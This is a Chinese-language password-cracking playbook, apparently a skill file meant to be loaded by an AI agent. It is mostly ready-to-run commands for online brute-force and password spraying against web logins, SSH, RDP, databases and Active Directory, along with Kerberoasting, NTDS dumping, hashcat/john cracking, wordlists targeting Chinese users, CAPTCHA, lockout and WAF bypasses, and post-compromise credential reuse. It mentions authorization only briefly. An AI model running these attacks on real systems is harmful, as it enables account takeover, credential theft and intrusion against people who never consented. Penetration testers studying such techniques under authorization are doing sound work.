# 密码爆破专项（password-cracking）

> 来源：jiejieskill SKILL.md 拆分（2026-08-11）。由 SKILL.md 相应章节按需加载。
> 认证全流程（枚举/注册/改密/短信验证码）见 `auth-testing.md`；本文件专注**爆破本身**：在线服务 → 离线哈希 → 字典定制 → 绕过对抗。

---

### A. 在线服务爆破

#### A.1 Web 表单 / API 登录

> ★ **本 skill 自带零依赖爆破器 `scripts/http_brute.py`**（并发线程 / XFF 轮换 / CSRF token 自动提取 / 代理 / 命中即停），纯登录口用它最快：
> ```bash
> cd <jiejieskill>/scripts
> python http_brute.py -u admin -P pass.txt --url https://target/login \
>     --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" -t 10 --xff --stop-on-hit
> # JSON: 加 --json，--data '{"u":"^USER^","p":"^PASS^"}'，成功判定 --found-marker '"token"'
> # CSRF: 加 --csrf-url <登录页> --csrf-regex 'name="csrf" value="([^"]+)"'，body 用 ^TOKEN^
> # 密码喷射: -L users.txt -p 'P@ss2024!'
> # 自检: python http_brute.py --selftest
> ```
> 复杂表单/需要响应分组对比时仍用 Burp Intruder。

```bash
# Burp Intruder 优先（可处理复杂表单）：
#   Cluster bomb 用户名×密码；先小样本调好请求格式，再全量跑
#   成功判定：状态码 / 响应长度 / 是否 Set-Cookie / 重定向目标，响应分组对比
# hydra Web 表单（最后一个冒号后=登录失败提示词，可多组）
hydra -L users.txt -P top500.txt target http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid username or password"
# 密码喷射（防锁定）：一个密码打所有账号
hydra -L users.txt -p 'Spring2025!' target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
# 表单带 CSRF token → hydra 失效，用 Burp 宏/扩展抓 token 再爆破
# JSON/API 登录 → Burp Repeater 改 Content-Type: application/json，Intruder 爆破 body
# HTTP Basic
hydra -L users.txt -P pass.txt target http-get /admin
```

#### A.2 网络服务爆破（SSH / RDP / FTP / SMB / Telnet / VNC / WinRM）
```bash
hydra -L users.txt -P pass.txt ssh://target -t 4          # 并发调低防封禁
hydra -L users.txt -P pass.txt ftp://target
hydra -L users.txt -P pass.txt smb://target
hydra -t 4 -V -f -l admin -P pass.txt rdp://target
hydra -l admin -P pass.txt telnet://target
hydra -l admin -P pass.txt vnc://target
hydra -l admin -P pass.txt winrm://target
# 多工具互补（失败指纹/协议差异换工具）
medusa -h target -u admin -P pass.txt -M ssh -t 4
ncrack -p ssh -U users.txt -P pass.txt target
crowbar -b rdp -s 192.168.1.0/24 -u admin -C pass.txt -n 1
patator ssh_login host=target user=FILE0 password=FILE1 0=users.txt 1=pass.txt -x ignore:code=1
```

#### A.3 数据库爆破
```bash
hydra -L users.txt -P pass.txt mysql://target
hydra -L users.txt -P pass.txt mssql://target
hydra -L users.txt -P pass.txt postgres://target
# Oracle 常见：oracle-listener / oracle-sid 服务
hydra -l sys -P pass.txt oracle-listener://target:1521
# Redis 带密码时
hydra -l default -P pass.txt redis://target
# 或脚本循环（存在即未授权/弱口令）
for p in $(cat pass.txt); do redis-cli -h target -a "$p" ping 2>/dev/null | grep -q PONG && echo "HIT: $p"; done
# MongoDB / ES 等通常直接测未授权，弱口令其次
# 打点优先试默认/常见弱口令：root/toor、postgres/postgres、mysql/mysql、admin/admin
```

#### A.4 AD 域 / 内网爆破与喷射
```bash
# 密码喷射（首选，避免锁定）：低频、每账号少试、--continue-on-success
crackmapexec smb <DC/CIDR> -u users.txt -p 'Password123' --continue-on-success
# NetExec（crackmapexec 新版）
nxc smb <DC> -u users.txt -p pass.txt --continue-on-success
# 域内多协议：smb / ssh / mysql / rdp / winrm 均可
# Kerberoasting / AS-REP Roasting（拿到哈希转离线，更隐蔽）
GetUserSPNs.py domain/user:pass -dc-ip <DC> -request -outputfile kerb.txt
GetNPUsers.py domain/user:pass -dc-ip <DC> -usersfile users.txt -outputfile asrep.txt
# 喷射命中 → 拿哈希 → 离线破解（见 B 节）
```

#### A.5 邮箱 / 其他
```bash
hydra -t 1 -L users.txt -P pass.txt smtp://target -v       # 慢速防封
hydra -l admin -P pass.txt imap://target
# 弱口令自查：hydra -C default-creds.txt（user:pass 组合文件）打一轮
```

---

### B. 离线哈希破解（hashcat / john）

#### B.1 哈希类型识别
```bash
hashid -m '<hash>'                  # 候选类型
hashcat --identify hash.txt         # 新版直接识别（一行一个哈希）
nth -t '<hash>'                     # Name-That-Hash
# 常见类型 ↔ hashcat mode：
#   MD5=0  NTLM=1000  SHA1=100  LM=3000  bcrypt=3200  sha512crypt=1800
#   sha256crypt=7400  md5crypt=500  DCC2=2100  KeePass=13400
#   WPA-PBKDF2=22000  Kerberoast(etype23)=13100  AS-REP(etype23)=18200
#   ZIP=17200/17220  RAR=12500  Office=9600/9700/9800
# 国密 SM3：hashcat 无原生 mode → 基于本 skill `sm2_k_reuse.py` 的 sm3_hash 写字典遍历，
#   或 `sm3_tool.py --expect` 单条比对（SM3 破解是纯暴力，只适合弱口令）
```

#### B.2 常用破解命令
```bash
# 字典攻击
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt
# 加规则（从基础词派生变体，性价比最高）
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/best64.rule
# 掩码（纯暴力）：8 位数字
hashcat -m 0 -a 3 hash.txt '?d?d?d?d?d?d?d?d'
# 增量掩码（6-8 位小写+数字）
hashcat -m 1000 -a 3 ntlm.txt '?l?l?l?l?l?l?d?d' --increment --force
# 组合攻击（两字典拼接：名字+数字）
hashcat -m 0 -a 1 hash.txt names.txt numbers.txt
# 长任务优化：-O 内核优化、-w 3 满负荷、--force
hashcat -m 22000 -a 0 handshake.22000 rockyou.txt -O -w 3
# John 等价
john --wordlist=rockyou.txt hash.txt
john --format=nt --rules=Jumbo ntlm.txt
john --mask='?u?l?l?l?l?d?d' hash.txt
# 破解成功判定：hashcat 输出 CRACKED！ 行 / john 显示密码
```

#### B.3 场景化提取 → 破解
```bash
# WPA/WPA2：握手包 → 22000
hcxpcapngtool capture.pcap -o handshake.22000
hashcat -m 22000 -a 0 handshake.22000 rockyou.txt
# 域哈希：secretsdump 导 NTDS → NTLM 破解
secretsdump.py domain/user:pass@DC -ntds ntds.dit -system SYSTEM
hashcat -m 1000 -a 0 ntds-ntlm.txt rockyou.txt
# 压缩包 / 文档 / 密码管理器
zip2john file.zip > z.hash && john z.hash
rar2john file.rar > r.hash && john r.hash
keepass2john db.kdbx > k.hash && john k.hash
office2john file.docx > o.hash && john o.hash
# Linux shadow：unshadow 合并后破解
unshadow passwd shadow > un.txt && john un.txt
# 带盐哈希：文件行格式 `user:hash`，hashcat/john 自动取 salt
```

---

### C. 字典定制生成

#### C.1 经典字典
```bash
# kali 自带
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/                    # rockyou 变体、xato-net-10-million、Common-Credentials/
# 国内高频口令：SecLists 中文口令 top 版（姓名全拼+123、1314520、5201314、1qaz2wsx、Aa123456）
```

#### C.2 目标定制
```bash
# cupp：按目标个人信息（姓名/生日/昵称/手机）交互式生成
cupp -i
# cewl：从目标站点爬取词组（产品名/栏目词常被当密码）
cewl http://target.com -d 3 -m 6 -w words.txt
# crunch：按长度/字符集/模板生成
crunch 8 8 'abc123' -o 8len.txt                  # 8 位，字符集 abc123 全组合
crunch 6 8 '0123456789' -t pass%% -o d.txt        # pass+两位数字（% = 数字占位）
# 规则引擎批量派生：从基础词扩展出变体（加数字/符号/大小写）
hashcat --stdout -a 0 base.txt -r rules/d3ad0ne.rule > dict.txt
# princeprocessor：词组组合拼接
pp64 -o dict.txt wordlist.txt
```

#### C.3 国内实战口令构造（授权场景按目标信息定制）
```
# 姓名拼音体系：liuyang / ly / liuyang123 / liuyang2024 / ly123456
# 数字偏好：生日(yy/mmdd)、手机尾号、1314520、5201314、666/888、123/666/888
# 企业/公司：acme、ACME、acme@2024、ACME2024!、acme_2024
# 平台弱口令高频：admin/admin123、123456、password、qwerty、1qaz2wsx、P@ssw0rd、aA123456
# 账号联动：用户名=手机号/邮箱 → 密码常取 手机后6位 / 邮箱前缀+123
# 组合优先级：姓名拼音+年份 > 拼音+手机尾4位 > 英文+@+年份 → 用 hashcat 规则/掩码跑变体
```

---

### D. 爆破绕过对抗

#### D.1 验证码对抗
```bash
# 逻辑绕过优先（免费且稳）：
#   验证码前端校验 → 改响应/禁 JS 直接发请求
#   验证码回显/固定/万能(0000/8888) → 直接复用
#   仅校验一次 / 会话内共用 → 先取一次再爆破
#   图形码长度固定纯数字 → 字典遍历 0000-9999
# 本地 OCR：ddddocr（国内常用，免费）
pip install ddddocr
#   import ddddocr
#   ocr = ddddocr.DdddOcr()
#   print(ocr.classification(open('cap.png','rb').read()))
# 打码平台（高难/干扰大）：超级鹰 / 图鉴 / 云码 → 接 Burp 打码插件自动识别
```

#### D.2 账号锁定绕过
```bash
# 密码喷射：低频、每账号 1-3 次、间隔随机 → 不触发锁定（域环境首选）
crackmapexec smb <DC> -u users.txt -p 'Password123' --continue-on-success
# 多账号交替 / 用户字典乱序 / 多 IP 分散尝试
# 优先测「忘记密码/找回」接口的验证码：常无锁定、无频控
# ⚠️ 锁定策略可被利用做账号枚举/DoS，仅在授权范围内测
```

#### D.3 速率限制 / WAF 封禁绕过
```bash
# 简单接口：伪造 X-Forwarded-For 轮换（WAF 看 XFF 则失效）
curl -H "X-Forwarded-For: 1.2.3.4" ...
# 代理池：proxychains + 多个 socks / Burp 上游代理轮换出口
# Turbo Intruder 高速并发（不等响应，绕过基于计数的频控）
#   典型脚本：
#   def queueRequests(target, wordlists):
#       engine = RequestEngine(endpoint=target.endpoint,
#                              concurrentConnections=20,
#                              requestsPerConnection=10)
#       for word in open('pass.txt'):
#           engine.queue(target.req, word.rstrip())
# 慢速低频：0.5-1 次/秒、随机间隔，模拟真人长期跑
# 行为模拟：先正常走一遍登录/验证码建立 session 再爆破；随机 UA/Referer/Accept
# 被封特征：429 / 弹验证码 / 封 IP → 换隧道、调并发、降频率
```

#### D.4 爆破决策树
```
拿到登录/认证入口
  ├─ 有验证码 → 逻辑绕过(回显/固定/前端/万能) > ddddocr > 打码平台
  ├─ 无验证码无锁定 → 直接 hydra / Burp Intruder 爆破
  ├─ 有锁定策略 → 密码喷射 / 分布式 / 慢速 / 改测找回密码接口
  ├─ 有速率限制/WAF → IP 轮换 / Turbo Intruder / 代理池 / 行为模拟
  └─ 能拿到哈希 → 转离线 hashcat / john（最隐蔽、最高效）
爆破成功后：核对可用账号 → 复用口令撞库 → 横向扩展
⚠️ 全程在授权范围内，记录爆破动作与成功口令，报告附证据
```

---

### 参考资源
- hydra: https://github.com/vanhauser-thc/thc-hydra ｜ medusa / ncrack / crowbar / patator
- CrackMapExec/NetExec: https://github.com/Pennyw0rth/NetExec
- hashcat: https://hashcat.net/wiki/ ｜ John the Ripper: https://www.openwall.com/john/
- SecLists Passwords: https://github.com/danielmiessler/SecLists ｜ cupp / cewl / crunch（kali 自带）
- ddddocr: https://github.com/sml2h3/ddddocr
